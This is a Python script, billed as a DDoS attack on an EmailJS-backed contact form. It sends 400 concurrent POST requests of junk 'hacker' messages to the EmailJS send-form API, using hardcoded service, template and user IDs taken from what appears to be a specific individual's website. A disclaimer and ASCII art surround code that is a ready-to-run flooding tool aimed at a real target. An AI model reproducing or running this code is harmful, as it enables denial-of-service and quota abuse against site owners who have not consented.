#DDos Attack in the send form Tested to work with emailJS
"""
Strongly advised not to use this code
Use at your own risk or with prior consent of the owner or with legal warrant.
Author or anyone involved in development of the code is not responsible for the outcome due to this code 
Author : Samrat Pant
samrat.sammie@gmail.com
"""

import requests
import threading
import time
print ("""\

    Author :- Samrat Pant
    Author or anyone involved with this code is not responsible for the outcome due to use of anypart of this code 
    Use at your own risk.
                        ...----....
                         ..-:"''         ''"-..
                      .-'                      '-.
                    .'              .     .       '.
                  .'   .          .    .      .    .''.
                .'  .    .       .   .   .     .   . ..:.
              .' .   . .  .       .   .   ..  .   . ....::.
             ..   .   .      .  .    .     .  ..  . ....:IA.
            .:  .   .    .    .  .  .    .. .  .. .. ....:IA.
           .: .   .   ..   .    .     . . .. . ... ....:.:VHA.
           '..  .  .. .   .       .  . .. . .. . .....:.::IHHB.
          .:. .  . .  . .   .  .  . . . ...:.:... .......:HIHMM.
         .:.... .   . ."::"'.. .   .  . .:.:.:II;,. .. ..:IHIMMA
         ':.:..  ..::IHHHHHI::. . .  ...:.::::.,,,. . ....VIMMHM
        .:::I. .AHHHHHHHHHHAI::. .:...,:IIHHHHHHMMMHHL:. . VMMMM
       .:.:V.:IVHHHHHHHMHMHHH::..:" .:HIHHHHHHHHHHHHHMHHA. .VMMM.
       :..V.:IVHHHHHMMHHHHHHHB... . .:VPHHMHHHMMHHHHHHHHHAI.:VMMI
       ::V..:VIHHHHHHMMMHHHHHH. .   .I":IIMHHMMHHHHHHHHHHHAPI:WMM
       ::". .:.HHHHHHHHMMHHHHHI.  . .:..I:MHMMHHHHHHHHHMHV:':H:WM
       :: . :.::IIHHHHHHMMHHHHV  .ABA.:.:IMHMHMMMHMHHHHV:'. .IHWW
       '.  ..:..:.:IHHHHHMMHV" .AVMHMA.:.'VHMMMMHHHHHV:' .  :IHWV
        :.  .:...:".:.:TPP"   .AVMMHMMA.:. "VMMHHHP.:... .. :IVAI
       .:.   '... .:"'   .   ..HMMMHMMMA::. ."VHHI:::....  .:IHW'
       ...  .  . ..:IIPPIH: ..HMMMI.MMMV:I:.  .:ILLH:.. ...:I:IM
     : .   .'"' .:.V". .. .  :HMMM:IMMMI::I. ..:HHIIPPHI::'.P:HM.
     :.  .  .  .. ..:.. .    :AMMM IMMMM..:...:IV":T::I::.".:IHIMA
     'V:.. .. . .. .  .  .   'VMMV..VMMV :....:V:.:..:....::IHHHMH
       "IHH:.II:.. .:. .  . . . " :HB"" . . ..PI:.::.:::..:IHHMMV"
        :IP""HHII:.  .  .    . . .'V:. . . ..:IH:.:.::IHIHHMMMMM"
        :V:. VIMA:I..  .     .  . .. . .  .:.I:I:..:IHHHHMMHHMMM
        :"VI:.VWMA::. .:      .   .. .:. ..:.I::.:IVHHHMMMHMMMMI
        :."VIIHHMMA:.  .   .   .:  .:.. . .:.II:I:AMMMMMMHMMMMMI
        :..VIHIHMMMI...::.,:.,:!"I:!"I!"I!"V:AI:VAMMMMMMHMMMMMM'
        ':.:HIHIMHHA:"!!"I.:AXXXVVXXXXXXXA:."HPHIMMMMHHMHMMMMMV
          V:H:I:MA:W'I :AXXXIXII:IIIISSSSSSXXA.I.VMMMHMHMMMMMM
            'I::IVA ASSSSXSSSSBBSBMBSSSSSSBBMMMBS.VVMMHIMM'"'
             I:: VPAIMSSSSSSSSSBSSSMMBSSSBBMMMMXXI:MMHIMMI
            .I::. "H:XIIXBBMMMMMMMMMMMMMMMMMBXIXXMMPHIIMM'
            :::I.  ':XSSXXIIIIXSSBMBSSXXXIIIXXSMMAMI:.IMM
            :::I:.  .VSSSSSISISISSSBII:ISSSSBMMB:MI:..:MM
            ::.I:.  ':"SSSSSSSISISSXIIXSSSSBMMB:AHI:..MMM.
            ::.I:. . ..:"BBSSSSSSSSSSSSBBBMMMB:AHHI::.HMMI
            :..::.  . ..::":BBBBBSSBBBMMMB:MMMMHHII::IHHMI
            ':.I:... ....:IHHHHHMMMMMMMMMMMMMMMHHIIIIHMMV"
              "V:. ..:...:.IHHHMMMMMMMMMMMMMMMMHHHMHHMHP'
               ':. .:::.:.::III::IHHHHMMMMMHMHMMHHHHM"
                 "::....::.:::..:..::IIIIIHHHHMMMHHMV"
                   "::.::.. .. .  ...:::IIHHMMMMHMV"
                     "V::... . .I::IHHMMV"'
                       '"VHVHHHAHHHHMMV:"'




    """)
#changr the WebURL with the email domain of the website to run or alternativerly for the headers capture the headers in chrome and pate the relevant contents next to it 
url = "https://api.emailjs.com:443/api/v1.0/email/send-form"
headers = {"Connection": "close", "sec-ch-ua": "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0Jfu2Wt30n4Y4Lqc", "Accept": "*/*", "Origin": "{webURL herer}", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://pramishluitel.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"}
data = "------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"w3lName\"\r\n\r\nHAcker \r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"w3lSender\"\r\n\r\nhacker@hacker.com\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"w3lSubject\"\r\n\r\nsdasdas@asdfasd.com\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"w3lMessage\"\r\n\r\nasdasdasdasd\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"lib_version\"\r\n\r\n2.6.4\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"service_id\"\r\n\r\nservice_7rhwgtu\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"template_id\"\r\n\r\ntemplate_dtqox5f\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc\r\nContent-Disposition: form-data; name=\"user_id\"\r\n\r\nuser_Wvvzpba0d8hJjwedjubKu\r\n------WebKitFormBoundary0Jfu2Wt30n4Y4Lqc--\r\n"
start = time.time()
def do_request():
    # while True:
    response = requests.post(url, headers=headers, data=data)
    print (response)
    stop = start - time.time()
    print (stop)
    # print(Hello)

threads = []

for i in range (400):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range (400):
    threads[i].start()

for i in range (400):
    threads[i].join()